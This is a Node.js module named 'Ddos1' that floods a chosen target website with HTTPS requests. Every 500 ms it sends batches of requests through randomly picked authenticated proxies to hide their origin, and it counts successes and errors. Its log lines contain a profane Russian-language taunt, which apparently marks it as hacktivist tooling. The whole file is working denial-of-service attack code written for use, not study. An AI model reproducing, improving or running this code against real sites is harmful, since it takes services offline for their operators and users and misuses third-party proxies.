const http = require('http');
const https = require('https');
const ProxiesList = require('./proxy-list.js');
const process = require('process')

function fetchRandomProxy(){
  return ProxiesList[Math.floor(Math.random() * ProxiesList.length)];
}

function Ddos1(){
  this.manager = {
    errors: 0,
    success: 0,
    loop_counter: 0,
    loop_link: null,
    loop_attempt: 0
  };
}

Ddos1.prototype.run = function run(package_size, Target, Path = '/'){
  var _this = this;


  function RuskiykorablyIdiNahuy(){
    const Proxy = fetchRandomProxy();
    for (var i = 0; i < package_size; i++) {
      try {
        bombaredByProxy(Proxy, Target)
      } catch (e){
        console.log('asdasda', e)
      }
    }
    console.log("[" + (++_this.manager.loop_counter) + "][PxID: " + Proxy.id + "]Русский Военный Корабль {" + Target + "} - иди нахуй: Успешно - " + (_this.manager.success) + ', Ответно нахуй - ' +  (_this.manager.errors));
  }

  function bombaredByProxy(Proxy, Target){
      http.request({
        host: Proxy.host, port: Proxy.port, method: 'CONNECT',
        path: Target + ':443' + Path,
        headers: {'Proxy-Authorization': 'Basic ' + Buffer.from(Proxy.login + ':' + Proxy.pass).toString('base64')}
      })
      .on('connect', (res, socket) => {
        switch (res.statusCode){
          case 200:
            const agent = new https.Agent({ socket });
              https.get({host: Target, path: Path, agent}, (res) => {
                res.on('data', () => {})
                res.on('end', () => ++_this.manager.success)
                res.on('error', (e) => console.log(e))
              })
            break;
          default:

            ++_this.manager.errors;
            if(++_this.manager.loop_attempt > 1000) {
              console.log('Что-то идет не так, проверь систему: ' + res.statusCode);
              return process.exit();
            }
            console.log('[Retry code: ' + res.statusCode + ']: ' + _this.manager.loop_attempt);
            break;
        }
      })
      .on('error', () => {
        ++_this.manager.errors;
      })
      .end();
  }


  _this.loop_link = setInterval(RuskiykorablyIdiNahuy, 500);
  // _this.loop_link = setInterval(RuskiykorablyIdiNahuy, 1500);
  // _this.loop_link = setInterval(RuskiykorablyIdiNahuy, 2500);

}

module.exports = Ddos1;